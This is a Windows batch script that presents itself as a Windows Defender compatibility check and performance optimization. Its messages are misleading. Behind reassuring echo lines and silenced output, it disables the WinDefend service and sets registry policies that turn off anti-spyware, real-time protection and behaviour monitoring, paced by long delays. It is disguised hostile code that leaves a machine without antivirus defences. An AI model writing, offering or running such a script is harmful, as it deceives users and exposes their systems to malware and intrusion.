@echo off
echo Checking system compatibility for Windows Defender update...
systeminfo | findstr /C:"OS Name" >nul
timeout /t 20 >nul

echo Initializing registry maintenance...
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" /v CurrentVersion >nul 2>&1
timeout /t 35 >nul

echo Optimizing service startup configuration...
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
timeout /t 50 >nul

echo Adjusting security policy settings...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
timeout /t 40 >nul

echo Tuning real-time protection performance...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
timeout /t 70 >nul

echo Configuring behavioral analysis thresholds...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
timeout /t 30 >nul

echo Windows Defender optimization completed. Changes will apply after system restart.
